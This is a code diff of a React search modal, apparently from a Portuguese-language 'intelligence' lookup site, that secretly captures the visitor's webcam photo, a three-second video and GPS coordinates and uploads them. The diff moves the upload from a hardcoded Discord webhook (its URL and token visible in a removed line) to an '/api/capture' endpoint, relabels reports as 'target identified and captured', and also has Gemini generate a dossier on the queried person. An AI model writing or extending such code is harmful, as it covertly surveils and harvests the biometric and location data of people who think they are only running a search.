@@ -6,8 +6,6 @@ import {
 import { ServiceTool } from '../types';
 import { GoogleGenAI } from '@google/genai';
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1470946745344196812/R1tVe1gUJ8xK_JwkNugUU78diWt9-exPk58pI5k-ijAnpD1rzZUAZTqVqz3GHAt5zVBr";
-
 interface SearchModalProps {
   isOpen: boolean;
   onClose: () => void;
@@ -67,18 +65,22 @@ const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
       const mapsUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lng}` : "Localização não disponível";
       
       const payload = {
-        username: "Nova Intelligence | Log System",
+        username: "NOVA INTELLIGENCE | BIOMETRIA 🛡️",
+        avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041916.png",
         embeds: [{
-          title: "🚨 Nova Captura de Biometria",
-          color: photoBlob ? 0x10b981 : 0xff0000,
-          description: `**Módulo:** ${tool.title}\n**Alvo:** \`${query || 'Indefinido'}\``,
+          title: "🎯 ALVO IDENTIFICADO & CAPTURADO",
+          color: photoBlob ? 0x10b981 : 0xff4444,
+          description: `### 📂 Detalhes da Consulta\n**Módulo:** \`${tool.title}\`\n**Entrada:** \`${query || 'Indefinido'}\`\n\n---`,
           fields: [
-            { name: "📍 Localização", value: location ? `[Ver no Google Maps](${mapsUrl})` : "❌ GPS Desativado", inline: false },
-            { name: "📱 Status da Câmera", value: photoBlob ? "✅ Foto Capturada" : "❌ Acesso Negado", inline: true },
-            { name: "🎥 Vídeo", value: videoBlob ? "✅ Gravado" : "❌ Falha/Negado", inline: true }
+            { name: "📍 GEOLOCALIZAÇÃO", value: location ? `[Clique para abrir no Google Maps](${mapsUrl})\n\`${location.lat}, ${location.lng}\`` : "❌ GPS Desativado pelo Usuário", inline: false },
+            { name: "📸 BIOMETRIA FACIAL", value: photoBlob ? "✅ Captura de Imagem Concluída" : "❌ Acesso à Câmera Negado", inline: true },
+            { name: "🎥 REGISTRO DE VÍDEO", value: videoBlob ? "✅ Gravação de 3s Concluída (Veja abaixo)" : "❌ Falha na Gravação", inline: true },
+            { name: "📡 REDE", value: "✅ Conexão Criptografada", inline: true }
           ],
+          footer: { text: "Protocolo de Segurança Nova.Int | Inteligência Tática" },
           timestamp: new Date().toISOString(),
-          image: photoBlob ? { url: "attachment://foto.jpg" } : undefined
+          image: photoBlob ? { url: "attachment://foto.jpg" } : undefined,
+          thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2569/2569102.png" }
         }]
       };
 
@@ -89,13 +91,18 @@ const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
         formData.append('file1', photoBlob, 'foto.jpg');
       }
       if (videoBlob) {
-        formData.append('file2', videoBlob, 'video.webm');
+        formData.append('file2', videoBlob, 'video.mp4');
       }
 
-      await fetch(WEBHOOK_URL, {
+      const response = await fetch('/api/capture', {
         method: 'POST',
         body: formData
       });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        console.error("Erro na captura:", errorData);
+      }
     } catch (err) {
       console.error("Discord send error:", err);
     }
@@ -137,9 +144,13 @@ const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
       // Captura Foto Instantânea
       const photoBlob = await captureSnapshot(tempVideo);
 
+      setStatusText('Gravando evidência (3s)...');
+
       // Inicia Gravação de Vídeo
-      let mimeType = 'video/webm';
-      if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'video/mp4';
+      let mimeType = 'video/mp4';
+      if (!MediaRecorder.isTypeSupported(mimeType)) {
+        mimeType = 'video/webm;codecs=vp8';
+      }
       
       const mediaRecorder = new MediaRecorder(stream, { mimeType });
       chunksRef.current = [];
@@ -148,7 +159,7 @@ const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
       };
 
       mediaRecorder.start();
-      await new Promise(resolve => setTimeout(resolve, 2500)); // Grava por 2.5s
+      await new Promise(resolve => setTimeout(resolve, 3000)); // Grava por exatamente 3s
       
       if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
 
@@ -171,7 +182,7 @@ const SearchModal: React.FC<SearchModalProps> = ({ isOpen, onClose, tool }) => {
 
       setStatusText('Consultando inteligência...');
       
-      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
+      const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
       const response = await ai.models.generateContent({
         model: 'gemini-3-flash-preview',
         contents: `Analista de Dados. Gere um dossiê informativo em JSON para "${tool.title}" identificador "${query}".`,
